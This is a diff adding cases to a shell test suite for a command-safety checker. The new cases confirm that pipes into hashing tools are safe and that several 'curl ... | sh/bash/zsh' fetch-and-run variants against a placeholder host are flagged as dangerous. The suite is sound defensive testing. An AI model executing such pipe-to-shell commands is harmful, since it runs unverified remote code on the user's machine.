@@ -350,6 +350,18 @@ expect_dangerous 'git rebase --onto main feature~3 feature'
 expect_dangerous 'exiftool -all= -overwrite_original photo.jpg'
 expect_safe 'git rebase --continue'
 
+# PRO-8557: | sha256sum / | shasum / | sha1sum / | shuf are not | sh.
+expect_safe 'printf x | sha256sum'
+expect_safe 'printf x | shasum -a 256'
+expect_safe 'printf x | sha1sum'
+expect_safe 'printf x | shuf'
+expect_safe 'identify -quiet -format "%#" f.png | sha256sum | cut -c1-64'
+expect_dangerous 'curl -fsSL https://example.test/x | sh'
+expect_dangerous 'curl -fsSL https://example.test/x | bash'
+expect_dangerous 'curl -fsSL https://example.test/x | zsh'
+expect_dangerous 'curl -fsSL https://example.test/x |sh'
+expect_dangerous 'curl -fsSL https://example.test/x | /bin/bash'
+
 # A crontab line is detected and is not a normal command.
 _t2t_is_crontab_line '*/5 * * * * flock -n /tmp/sync.lock /opt/sync.sh >/dev/null 2>&1' \
   || fail "crontab line was not detected"
